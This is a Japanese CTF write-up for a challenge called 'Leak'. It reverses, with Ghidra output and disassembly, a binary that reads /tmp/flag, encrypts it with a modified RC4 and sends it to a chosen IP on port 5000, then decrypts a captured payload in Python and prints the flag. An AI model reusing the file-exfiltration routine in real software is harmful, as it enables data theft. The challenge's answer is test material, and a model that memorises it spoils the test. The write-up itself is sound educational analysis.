# Leak

`leak`というELFファイルと`record.pcap`が与えられます。「調査したところさらに不審なファイルを発見したので、通信記録と合わせて解析してください。」ということなので、まずは`leak`の挙動を解析します。

Ghidraでmain関数を確認し、変数名をつけていくと

```cpp
undefined8 main(void)

{
  // IPアドレスの入力を求める
  printf("Enter IP address: ");
  res = fgets(input_ip_addr,0x10,stdin);
  if (res == (char *)0x0) {
    perror("Failed to read IP address");
    ret = 1;
  }
  else {
    // IPアドレスの文字列を確認
    input_ip_addr_len = strlen(input_ip_addr);
    if ((input_ip_addr_len != 0) && (sock.sa_data[input_ip_addr_len + 0xd] == '\n')) {
      sock.sa_data[input_ip_addr_len + 0xd] = '\0';
    }

    // /tmp/flagファイルを開く
    flag_fp = fopen("/tmp/flag","r");
    if (flag_fp == (FILE *)0x0) {
      perror("Failed to open file");
      ret = 1;
    }
    else {
      // /tmp/flagファイルの内容を読み込む
      sVar4 = fread(flag_file_buffer,1,0x400,flag_fp);
      fclose(flag_fp);
      strlen("KEY{th1s_1s_n0t_f1ag_y0u_need_t0_f1nd_rea1_f1ag}");

      // flag_file_bufferの内容を暗号化する sVar4は↑のstrlenの結果
      encrypt(flag_file_buffer,(int)sVar4);

      // 暗号化したflag_file_bufferを送信する
      sockfd = socket(2,1,0);
      if (sockfd == -1) {
        perror("Failed to create socket");
        ret = 1;
      }
      else {
        sock.sa_family = 2;
        sock.sa_data._0_2_ = htons(5000); // 宛先ポート番号は5000
        pton_res = inet_pton(2,local_428,sock.sa_data + 2);
        if (pton_res < 1) {
          perror("Invalid address/Address not supported");
          ret = 1;
        }
        else {
          conn_res = connect(sockfd,&sock,0x10);
          if (conn_res == -1) {
            perror("Failed to connect to server");
            ret = 1;
          }
          else {
            sock_res = send(sockfd,flag_file_buffer,sVar4,0);
            if (sock_res == -1) {
              perror("Failed to send data");
              ret = 1;
            }
            else {
              puts("Data sent successfully");
              close(sockfd);
              ret = 0;
            }
          }
        }
      }
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return ret;
}
```

となっています。`/tmp/flag`を読み込んで暗号化して送信しているようです。`encrypt`関数を確認すると

```cpp
void encrypt(char *flag_file_buffer,int flag_file_buffer_len)

{
  // [0x35, 0x36, ...]と続く長さ0x100の配列の生成
  for (i = 0; i < 0x100; i = i + 1) {
    state[i] = (char)i + 0x35;
  }

  // state[i]とstate[j]を決まった順番で入れ替える
  j = 0;
  for (i = 0; i < 0x100; i = i + 1) {
    j = (uint)state[i] +
                *(byte *)(in_RDX + (ulong)i % in_RCX) + j & 0xff;
    // state[i]とstate[j]をswap
    tmp = state[i];
    state[i] = state[j];
    state[j] = tmp;
  }

  x = 0;
  y = 0;
  // flag_file_buffer_lenの回数だけstate[x]とstate[y]を入れ替えてflag文字列を生成されたstateとXORする
  for (i = 0; (ulong)i < CONCAT44(in_register_00000034,flag_file_buffer_len);
      i = i + 1) {
    y = y + 1;
    x = x + state[(int)(uint)y];

    // swap
    tmp = state[(int)(uint)y];
    state[(int)(uint)y] = state[(int)(uint)x];
    state[(int)(uint)x] = tmp;

    flag_file_buffer[i] =
         flag_file_buffer[i] ^
         state
         [(int)(uint)(byte)(state[(int)(uint)x] + state[(int)(uint)y])];
  }
  return;
}
```

となります。ここで処理`*(byte *)(in_RDX + (ulong)i % in_RCX)`が何を与えられているかは逆アセンブル結果を見れば分かります。

まず`main`関数で`encrypt`関数を呼び出す直前に

```
00101671  LEA   RAX,[s_KEY{th1s_1s_n0t_f1ag_y0u_need_t0_001020 // この文字列のアドレスをRAXに格納
00101678  MOV   qword ptr [RBP + local_450],RAX=>s_KEY{th1s_1s // RAXの値をlocal_450に格納
0010167f  MOV   RAX,qword ptr [RBP + local_450]
00101686  MOV   RDI=>s_KEY{th1s_1s_n0t_f1ag_y0u_need_t0_001020
00101689  CALL  <EXTERNAL>::strlen                             // strlenでKEY文字列の長さを取得
0010168e  MOV   qword ptr [RBP + local_448],RAX                // 取得したKEY文字列を[RBP + local_448]に格納
00101695  MOV   RCX,qword ptr [RBP + local_448]                // RCXにKEY文字列の長さを格納
0010169c  MOV   RDX=>s_KEY{th1s_1s_n0t_f1ag_y0u_need_t0_001020 // RDXにKEY文字列を格納
001016a3  MOV   RSI,qword ptr [RBP + local_458]
001016aa  LEA   RAX=>local_418,[RBP + -0x410]
001016b1  MOV   RDI,RAX
001016b4  CALL  encrypt
```

ということで、`RDX`にはKEY文字列`KEY{th1s_1s_n0t_f1ag_y0u_need_t0_f1nd_rea1_f1ag}`、RCXにはKEY文字列の長さが格納された状態で`encrypt`関数が呼び出されています。

ということでこの処理をPythonに書き起こすと

```python
def encrypt(hex_stream, key):
    # RC4キーの初期化
    S = []
    for i in range(256):
        S.append((i + 53) % 256) # ここで53ずれた値を使う変更が加わっている
    j = 0
    key = [ord(c) for c in key]
    key_len = len(key)

    # RC4キーの生成
    for i in range(256):
        j = (j + S[i] + key[i % key_len]) % 256
        S[i], S[j] = S[j], S[i]

    # XORによる復号
    decrypted = []
    i = j = 0
    hex_stream = [int(hex_stream[i : i + 2], 16) for i in range(0, len(hex_stream), 2)]
    for byte in hex_stream:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        decrypted.append(byte ^ S[(S[i] + S[j]) % 256])

    # 復号されたストリームを文字列に変換
    decrypted_str = "".join([chr(byte) for byte in decrypted])
    return decrypted_str
```

となり著名な共通鍵暗号方式の`RC4`を少し変形させたものであると分かります。

ということで、`leak`は/tmp/flagファイルの内容を暗号鍵`KEY{th1s_1s_n0t_f1ag_y0u_need_t0_f1nd_rea1_f1ag}`を用いて少し変形させたRC4で暗号化し、それを指定されたIPアドレスの5000ポートに送信する機能があるとわかります。

では、`record.pcap`を見てみます。

No.4のパケットがOMLパケットと判定されていますが、これはマジックナンバーがたまたま一致したためそう表示されているだけとなっています。ここのパケットのペーロードに暗号化されたフラグが含まれていると考えられます。

ということで該当するパケットのペイロードを`Copy as a Hex Stream`でコピーして、`leak`の暗号化処理をPythonで書き起こした`encrypt`関数に与えてみます。

```python
def rc4_decrypt(hex_stream, key):
    # RC4キーの初期化
    S = []
    for i in range(256):
        S.append((i + 53) % 256) # ここで53ずれた値を使う変更が加わっている
    j = 0
    key = [ord(c) for c in key]
    key_len = len(key)

    # RC4キーの生成
    for i in range(256):
        j = (j + S[i] + key[i % key_len]) % 256
        S[i], S[j] = S[j], S[i]

    # XORによる復号
    decrypted = []
    i = j = 0
    hex_stream = [int(hex_stream[i : i + 2], 16) for i in range(0, len(hex_stream), 2)]
    for byte in hex_stream:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        decrypted.append(byte ^ S[(S[i] + S[j]) % 256])

    # 復号されたストリームを文字列に変換
    decrypted_str = "".join([chr(byte) for byte in decrypted])
    return decrypted_str


encrypted_hex_stream = "8e57ff5945da900628b2abfa497332334a7329413c34b7f66273250f954016fa47e9228da5cd3d53eeb4b3518ed289935be059cbfbb11b"
key = "KEY{th1s_1s_n0t_f1ag_y0u_need_t0_f1nd_rea1_f1ag}"

decrypted_text = rc4_decrypt(encrypted_hex_stream, key)
print(decrypted_text)
```

```
ctf4b{p4y_n0_4ttent10n_t0_t4at_m4n_beh1nd_t4e_cur4a1n}
```
